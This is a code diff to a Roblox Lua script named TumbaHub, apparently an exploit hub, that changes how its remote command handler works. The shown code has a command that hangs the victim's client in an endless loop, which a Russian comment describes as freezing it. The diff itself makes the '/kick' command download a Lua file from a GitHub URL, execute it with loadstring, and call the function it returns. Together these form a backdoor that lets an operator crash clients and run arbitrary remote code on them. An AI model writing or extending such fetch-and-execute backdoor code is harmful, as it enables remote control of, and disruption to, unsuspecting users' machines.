@@ -55,11 +55,24 @@ task.spawn(function()
                             -- Бесконечный цикл намертво вешает клиент Роблокса
                             while true do end 
                         elseif cmd =="/kick" then
-                            -- 1. Скачиваем код и превращаем в функцию
-                            local kickFunc = loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/kick.lua"))
+                            -- 1. Скачиваем файл с Гитхаба
+                            local chunk = loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/kick.lua"))
                             
+                            if chunk then
+                                -- 2. Выполняем файл, чтобы он ВЕРНУЛ нам функцию
+                                local realKickFunc = chunk()
+                                
+                                -- 3. Проверяем, что это реально функция, и передаем туда data
+                                if type(realKickFunc) == "function" then
+                                    realKickFunc(data) 
+                                else
+                                    warn("TumbaHub: kick.lua не вернул функцию!")
+                                end
+                            else
+                                warn("TumbaHub: Ошибка скачивания или синтаксиса в kick.lua")
                             end
                         end
+                    end
                         -- =========================
                     end
                 end
